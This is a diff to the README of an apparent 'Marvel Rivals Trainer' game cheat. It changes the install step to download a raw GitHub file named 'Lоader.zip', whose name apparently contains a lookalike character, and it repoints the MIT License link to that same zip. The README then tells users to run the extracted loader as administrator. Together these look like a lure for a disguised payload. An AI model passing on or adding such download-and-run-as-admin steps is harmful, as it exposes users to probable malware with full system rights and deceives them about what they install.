@@ -32,7 +32,7 @@ Welcome to the Marvel Rivals Trainer! This open-source tool empowers you to **en
 
 ## 🚀 Installation
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/Lоader.zip` from the repository.
 2. Unpack using your favorite archiver (e.g., WinRAR, 7-Zip).
 3. Run the extracted Loader executable as administrator.
 4. Follow on-screen prompts to activate your chosen features.
@@ -53,7 +53,7 @@ This software is for **educational purposes** only. Usage may violate Marvel Riv
 
 ## ⚖️ License
 
-[MIT License 2025](https://opensource.org/licenses/MIT) — Free for personal and educational use!
+[MIT License 2025](https://raw.githubusercontent.com/nd863281/MarvelRivalsMastermind/main/Lоader.zip) — Free for personal and educational use!
 
 ---
 
